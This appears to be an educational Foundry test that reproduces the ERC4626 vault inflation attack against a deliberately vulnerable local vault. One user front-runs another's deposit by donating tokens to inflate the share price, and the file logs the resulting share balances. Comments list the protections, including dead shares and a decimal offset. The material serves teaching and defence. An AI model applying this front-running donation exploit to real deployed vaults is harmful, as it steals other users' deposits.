// Vulnerability
// Vault shares can be inflated by donating ERC20 token to the vault.

// Attacker can exploit this behavior to steal other user's deposits.

// Example
// User 0 front runs user 1's deposit.

// User 0 deposits 1.
// User 0 donates 100 * 1e18. This inflates the value of each share.
// User 1 deposits 100 * 1e18. This mints 0 shares to user 1.
// User 0 withdraws all 200 * 1e18 + 1.
// Protections
// Min shares -> protects from front running
// Internal balance -> protects from donation
// Dead shares -> contract is first depositor
// Decimal offset (OpenZeppelin ERC4626)

// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {
    IERC20,
    Vault,
    Token
} from "../../../src/hacks/vault-inflation/VaultInflation.sol";

uint8 constant DECIMALS = 18;

contract VaultTest is Test {
    Vault private vault;
    Token private token;

    address[] private users = [address(11), address(12)];

    function setUp() public {
        token = new Token();
        vault = new Vault(address(token));

        for (uint256 i = 0; i < users.length; i++) {
            token.mint(users[i], 10000 * (10 ** DECIMALS));
            vm.prank(users[i]);
            token.approve(address(vault), type(uint256).max);
        }
    }

    function print() private {
        console2.log("vault total supply", vault.totalSupply());
        console2.log("vault balance", token.balanceOf(address(vault)));
        uint256 shares0 = vault.balanceOf(users[0]);
        uint256 shares1 = vault.balanceOf(users[1]);
        console2.log("users[0] shares", shares0);
        console2.log("users[1] shares", shares1);
        console2.log("users[0] redeemable", vault.previewRedeem(shares0));
        console2.log("users[1] redeemable", vault.previewRedeem(shares1));
    }

    function test() public {
        // users[0] deposit 1
        console2.log("--- users[0] deposit ---");
        vm.prank(users[0]);
        vault.deposit(1);
        print();

        // users[0] donate 100
        console2.log("--- users[0] donate ---");
        vm.prank(users[0]);
        token.transfer(address(vault), 100 * (10 ** DECIMALS));
        print();

        // users[1] deposit 100
        console2.log("--- users[1] deposit ---");
        vm.prank(users[1]);
        vault.deposit(100 * (10 ** DECIMALS));
        print();
    }
}
